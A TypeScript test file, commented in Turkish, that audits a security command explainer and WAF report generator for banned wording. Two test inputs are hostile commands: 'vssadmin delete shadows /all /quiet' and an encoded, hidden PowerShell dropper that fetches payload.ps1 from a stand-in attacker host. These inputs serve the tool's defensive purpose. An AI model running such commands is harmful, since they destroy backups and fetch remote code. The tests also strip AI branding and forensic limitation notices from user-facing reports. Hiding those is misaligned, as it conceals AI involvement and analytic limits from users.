import assert from 'node:assert';
import fs from 'node:fs';
import path from 'node:path';
import { explainCommand } from '../services/commandExplainer';
import {
  compareSecurityPeriods,
  generatePolicyEffectivenessHtmlReport,
  loadSampleWafComparisonScenario,
} from '../services/policyComparisonEngine';

console.log('================================================================');
console.log('🛡️ USER-FACING META-LANGUAGE & SYSTEM SELF-DESCRIPTION AUDIT 🛡️');
console.log('================================================================');

let passed = 0;
let total = 0;

function runAudit(name: string, fn: () => void) {
  total++;
  try {
    fn();
    passed++;
    console.log(`✅ [PASS ${total}] ${name}`);
  } catch (err: any) {
    console.error(`❌ [FAIL ${total}] ${name}`);
    console.error(err);
    throw err;
  }
}

// Banned user-facing meta phrases
const FORBIDDEN_USER_META_STRINGS = [
  'Grok',
  'Deterministik Çok Katmanlı Adli Motor',
  'Deterministik Adli Motor',
  'Forensic Engine',
  'AI Layer',
  'AI Engine',
  'Analysis Pipeline',
  'Metodoloji ve Adli Sınırlamalar',
  'Forensic Methodology',
  'Forensic Limitations',
  'Adli Metodoloji Uyarısı',
  'Sistem nasıl çalışıyor',
  'Bu analiz nasıl gerçekleştirildi',
  'Bu sonuç nasıl üretildi',
  'Forensic Caveat',
];

// -------------------------------------------------------------
// BÖLÜM 1: COMMAND EXPLAINER ÇIKTI DENETİMİ
// -------------------------------------------------------------
console.log('\n--- BÖLÜM 1: COMMAND EXPLAINER ÇIKTI DENETİMİ ---');

runAudit('Test 1.1: vssadmin delete shadows çıktısında yasaklı meta ifade bulunmamalı', () => {
  const res = explainCommand('vssadmin delete shadows /all /quiet');
  const text = res.fullNarrativeMarkdown;
  for (const forbidden of FORBIDDEN_USER_META_STRINGS) {
    assert(
      !text.includes(forbidden),
      `Komut çıktısında meta ifade bulundu: "${forbidden}"`
    );
  }
  // User value preserved
  assert(text.includes('1. Bu Komut Nedir ve Temel Amacı'));
  assert(text.includes('4. Bu Komut Çalışırsa Sistemde Ne Sorun Çıkartır?'));
});

runAudit('Test 1.2: PowerShell encoded dropper çıktısında yasaklı meta ifade bulunmamalı', () => {
  const res = explainCommand('powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AbABvAGMAYQBsAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==');
  const text = res.fullNarrativeMarkdown;
  for (const forbidden of FORBIDDEN_USER_META_STRINGS) {
    assert(
      !text.includes(forbidden),
      `Komut çıktısında meta ifade bulundu: "${forbidden}"`
    );
  }
  assert(res.decodedPayload?.includes('DownloadString'));
});

runAudit('Test 1.3: Rutin yönetim komutları (whoami, systemctl) çıktısında meta bulunmamalı', () => {
  const resWho = explainCommand('whoami /priv', { host: 'SRV-01' });
  for (const forbidden of FORBIDDEN_USER_META_STRINGS) {
    assert(!resWho.fullNarrativeMarkdown.includes(forbidden));
  }
  const resSys = explainCommand('systemctl status nginx');
  for (const forbidden of FORBIDDEN_USER_META_STRINGS) {
    assert(!resSys.fullNarrativeMarkdown.includes(forbidden));
  }
});

// -------------------------------------------------------------
// BÖLÜM 2: WAF & POLICY COMPARISON HTML RAPOR DENETİMİ
// -------------------------------------------------------------
console.log('\n--- BÖLÜM 2: WAF & POLICY COMPARISON HTML RAPOR DENETİMİ ---');

runAudit('Test 2.1: HTML Raporunda "Metodoloji ve Adli Sınırlamalar" bulunmamalı', () => {
  const scenario = loadSampleWafComparisonScenario();
  const comparisonResult = compareSecurityPeriods(
    scenario.periodAFiles,
    scenario.periodBFiles,
    { labelA: scenario.periodALabel, labelB: scenario.periodBLabel }
  );
  const html = generatePolicyEffectivenessHtmlReport(comparisonResult);

  assert(
    !html.includes('Metodoloji ve Adli Sınırlamalar'),
    'HTML raporunda "Metodoloji ve Adli Sınırlamalar" başlığı yer almamalıdır'
  );
  assert(
    !html.includes('Adli Metodoloji Uyarısı'),
    'HTML raporunda "Adli Metodoloji Uyarısı" yer almamalıdır'
  );
  assert(
    html.includes('7. 🛡️ Önerilen Güvenlik Aksiyonları'),
    'HTML raporunda 7. bölüm kullanıcı değeri sağlayan "Önerilen Güvenlik Aksiyonları" olmalıdır'
  );
  assert(
    html.includes('SOC &amp; Network Ekipleri İçin Tavsiyeler'),
    'HTML raporunda somut tavsiyeler yer almalıdır'
  );
});

// -------------------------------------------------------------
// BÖLÜM 3: EXCEL & KPI RAPOR DENETİMİ
// -------------------------------------------------------------
console.log('\n--- BÖLÜM 3: EXCEL RAPOR METİN DENETİMİ ---');

runAudit('Test 3.1: KPI tablosunda "Metodolojik Not" yerine sade "Açıklama" olmalı', () => {
  const engineSource = fs.readFileSync(path.resolve('src/services/policyComparisonEngine.ts'), 'utf-8');
  assert(
    !engineSource.includes("['Metrik', 'Dönem A (Öncesi)', 'Dönem B (Sonrası)', 'Fark / Değişim', 'Metodolojik Not']"),
    'Excel KPI tablosunda "Metodolojik Not" kalmamalı'
  );
  assert(
    engineSource.includes("['Metrik', 'Dönem A (Öncesi)', 'Dönem B (Sonrası)', 'Fark / Değişim', 'Açıklama']"),
    'Excel KPI tablosunda "Açıklama" bulunmalı'
  );
});

runAudit('Test 3.2: Target hosts sheet\'inde "Metodolojik Kural" ifadesi yer almamalı', () => {
  const excelSource = fs.readFileSync(path.resolve('src/services/policyExcelReportGenerator.ts'), 'utf-8');
  assert(
    !excelSource.includes('Metodolojik Kural'),
    'Excel generator dosyasında "Metodolojik Kural" kalmamalı'
  );
  assert(
    excelSource.includes('N/A (Birleşik oran uygulanamaz)'),
    'Excel generator dosyasında kullanıcıya doğrudan durum bildiren sade ifade bulunmalı'
  );
});

// -------------------------------------------------------------
// BÖLÜM 4: UI BİLEŞENLERİ VE MODALLARDA META METİN TARAMASI
// -------------------------------------------------------------
console.log('\n--- BÖLÜM 4: UI BİLEŞENLERİ KULLANICI METİN TARAMASI ---');

runAudit('Test 4.1: CommandExplainerModal.tsx içinde Grok veya motor self-description olmamalı', () => {
  const modalSource = fs.readFileSync(path.resolve('src/components/CommandExplainerModal.tsx'), 'utf-8');
  assert(!modalSource.includes('Grok &amp; AI'), 'Modal başlığında "Grok & AI" yer almamalı');
  assert(!modalSource.includes('Grok asistanı'), 'Modal açıklamasında "Grok asistanı" yer almamalı');
  assert(!modalSource.includes('Deterministik Çok Katmanlı Adli Motor'), 'Modal altında motor self-description yer almamalı');
  assert(!modalSource.includes('Zengin Adli Motor'), 'Modal badge alanında motor self-description yer almamalı');
  assert(modalSource.includes('<span>Komut Açıklayıcı</span>'), 'Modal başlığı sade olmalı');
  assert(modalSource.includes('<span>Komut ve Davranış Analizi</span>'), 'Modal altlığı sade olmalı');
});

runAudit('Test 4.2: Header.tsx içinde Grok veya gereksiz (AI) eki olmamalı', () => {
  const headerSource = fs.readFileSync(path.resolve('src/components/Header.tsx'), 'utf-8');
  assert(!headerSource.includes('Grok'), 'Header butonunda Grok yer almamalı');
  assert(!headerSource.includes('Komut Açıklayıcı (AI)'), 'Header butonunda gereksiz (AI) eki olmamalı');
  assert(headerSource.includes('<span>Komut Açıklayıcı</span>'), 'Header butonu sade olmalı');
});

runAudit('Test 4.3: AiSocAssistantModal.tsx içinde motor self-description olmamalı', () => {
  const aiModalSource = fs.readFileSync(path.resolve('src/components/AiSocAssistantModal.tsx'), 'utf-8');
  assert(!aiModalSource.includes('L3 SOC Adli Analiz Motoru Çalışıyor'), 'Loading alanında motor adı olmamalı');
  assert(!aiModalSource.includes('L3 Kural Tabanlı Güvenlik Motoru Devrede'), 'Fallback alanında motor adı olmamalı');
  assert(aiModalSource.includes('Güvenlik Analizi Yapılıyor'), 'Sade kullanıcı durumu bildirilmeli');
});

runAudit('Test 4.4: PolicyComparisonTab.tsx içinde "Metodoloji ve Adli Sınırlamalar" kutusu olmamalı', () => {
  const tabSource = fs.readFileSync(path.resolve('src/components/PolicyComparisonTab.tsx'), 'utf-8');
  assert(!tabSource.includes('7. ⚖️ Metodoloji ve Adli Sınırlamalar'), 'UI tabında metodoloji kutusu olmamalı');
  assert(tabSource.includes('7. 🛡️ Önerilen Güvenlik Aksiyonları'), 'UI tabında doğrudan güvenlik aksiyonları yer almalı');
});

console.log('================================================================');
console.log(`🎉 TÜM USER-FACING META DİL DENETİMLERİ BAŞARIYLA GEÇTİ: ${passed} / ${total}`);
console.log('================================================================');
